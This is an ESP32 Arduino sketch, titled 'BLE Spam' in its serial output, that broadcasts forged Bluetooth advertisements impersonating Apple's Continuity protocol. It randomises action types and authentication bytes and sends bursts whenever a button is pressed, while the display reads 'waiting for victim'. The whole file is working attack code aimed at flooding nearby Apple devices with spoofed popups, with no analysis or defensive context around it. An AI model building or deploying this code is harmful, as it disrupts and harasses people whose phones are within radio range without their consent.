#include "Screen.h"
#include <NimBLEDevice.h>

#include "Vars.h"
#include "Buttons.h"
#include "NeoPixel.h"

NimBLEAdvertising *pAdvertising;

void setup() {
  Serial.setRxBufferSize(1024);
  Serial.begin(115200);

  Buttons::setupButtons();

  Screen::initDisplay();
  Screen::displaySplash(3);
  Screen::displayWaitingForVictim();

  NeoPixel::setupNeoPixel();

  // Print a welcome message to the Serial port.
  Serial.println("\n\nBLE Spam, V1.0 compiled " __DATE__ " " __TIME__ " by Ryan");
  Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

  NimBLEDevice::init("");

  NimBLEServer *pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
 
  Serial.print("\n");
  Serial.print("Startup Time:");
  Serial.println(millis());
  Serial.print("\n");
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  Buttons::updateButtons();
  if (lastPressedButton == 0) {
    Serial.println("Button 0 pressed");
    delay(40);
    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  }
  else if (lastPressedButton == 1) {
    pAdvertising->stop();
  }
}
